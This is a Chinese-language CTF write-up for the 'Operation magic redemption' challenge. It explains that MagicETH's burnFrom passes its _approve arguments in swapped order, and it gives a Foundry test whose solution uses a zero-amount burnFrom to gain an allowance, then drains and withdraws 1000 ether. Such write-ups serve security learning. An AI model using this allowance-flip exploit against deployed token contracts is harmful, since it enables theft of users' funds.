## AMAZEX-DSS-PARIS Operation magic redemption 
这明明是个很简单的题我却看了很久都没有发现问题，最后看了下攻击原型https://foresightnews.pro/article/detail/32350
，才发现问题所在

具体是`burnFrom`里的`_approve(account, msg.sender, currentAllowance - amount);`前两个参数放反了。于是我们可以先允许exploiter用攻击合约的ether，调用这个函数使amount=0，然后现在这个approve允许攻击合约用exploiter的ether了

### 解题
``` solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {MagicETH} from "../src/1_MagicETH/MagicETH.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/




/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge1Test is Test {
    MagicETH public mETH;

    address public exploiter = makeAddr("exploiter");
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        mETH = new MagicETH();

        mETH.deposit{value: 1000 ether}();
        // exploiter is in control of 1000 tokens
        mETH.transfer(exploiter, 1000 ether);
    }

    function testExploit() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge1Test -vvvv //
        ////////////////////////////////////////////////////*/
        
        mETH.approve(exploiter,type(uint256).max);
        mETH.burnFrom(exploiter, 0 ether);
        mETH.transferFrom(exploiter, whitehat, 1000 ether);
        //注意将weth转化为eth
        mETH.withdraw(1000 ether);

        


        //==================================================//
        vm.stopPrank();

        assertEq(whitehat.balance, 1000 ether, "whitehat should have 1000 ether");
    }
}

```

